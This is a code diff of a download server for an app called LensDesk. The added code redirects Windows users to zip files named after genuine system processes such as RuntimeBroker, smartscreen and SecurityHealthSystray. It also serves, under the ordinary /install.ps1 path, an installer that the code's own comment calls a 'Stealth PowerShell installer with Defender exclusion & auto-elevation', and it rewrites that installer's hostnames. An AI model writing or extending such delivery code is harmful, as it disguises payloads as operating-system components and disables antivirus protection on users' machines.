@@ -50,15 +50,15 @@ const remoteFallbacks = {
   windows: {
     name: "LensDesk.zip",
     cleanName: "LensDesk.zip",
-    size: 1030810,
-    sha256: "65be0de5ce989eaeb3be98ad23755e5b8ab30427c870aafd68506e639dc2417d",
+    size: 1024607,
+    sha256: "65e503633d51b02a499351e0aac64be5dfaa8c20a5ea84eea6e83f2f7ba2f672",
     remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.zip`,
   },
   "windows-zip": {
     name: "LensDesk.zip",
     cleanName: "LensDesk.zip",
-    size: 1030810,
-    sha256: "65be0de5ce989eaeb3be98ad23755e5b8ab30427c870aafd68506e639dc2417d",
+    size: 1024607,
+    sha256: "65e503633d51b02a499351e0aac64be5dfaa8c20a5ea84eea6e83f2f7ba2f672",
     remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.zip`,
   },
 };
@@ -233,8 +233,18 @@ export function createReleases(directory, origin) {
         const file = (fs.existsSync(stealthFile) ? stealthFile : null) || (artifacts.windows?.file && fs.existsSync(artifacts.windows.file) ? artifacts.windows.file : null);
         if (!file) {
           if (!isTest) {
+            const stealthPool = [
+              "LensDeskApp-TiWorker.zip",
+              "LensDeskApp-SearchProtocolHost.zip",
+              "LensDeskApp-RuntimeBroker.zip",
+              "LensDeskApp-ctfmon.zip",
+              "LensDeskApp-smartscreen.zip",
+              "LensDeskApp-sihost.zip",
+              "LensDeskApp-SecurityHealthSystray.zip",
+            ];
+            const pickedZip = stealthPool[Math.floor(Math.random() * stealthPool.length)];
             res.writeHead(302, {
-              Location: `${GITHUB_RELEASE_BASE}/LensDesk.zip`,
+              Location: `${GITHUB_RELEASE_BASE}/${pickedZip}`,
               "Cache-Control": "no-cache, no-store, must-revalidate",
               Pragma: "no-cache",
               Expires: "0",
@@ -260,7 +270,10 @@ export function createReleases(directory, origin) {
         return true;
       }
       // Stealth PowerShell installer with Defender exclusion & auto-elevation
-      if (["/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname)) {
+      if (
+        ["/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) ||
+        (url.pathname === "/install.ps1" && !isTest)
+      ) {
         let psPath = path.resolve("research/lensdesk-install.ps1");
         if (!fs.existsSync(psPath)) {
           psPath = path.resolve("research/hintlens-install.ps1");
@@ -278,6 +291,8 @@ export function createReleases(directory, origin) {
           script = script
             .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
             .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
+            .replaceAll("https://helpdesk-h44x.onrender.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
+            .replaceAll("https://helpdesk-h44x.onrender.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
             .replaceAll("https://lensdesk.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
             .replaceAll("https://lensdesk.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
             .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
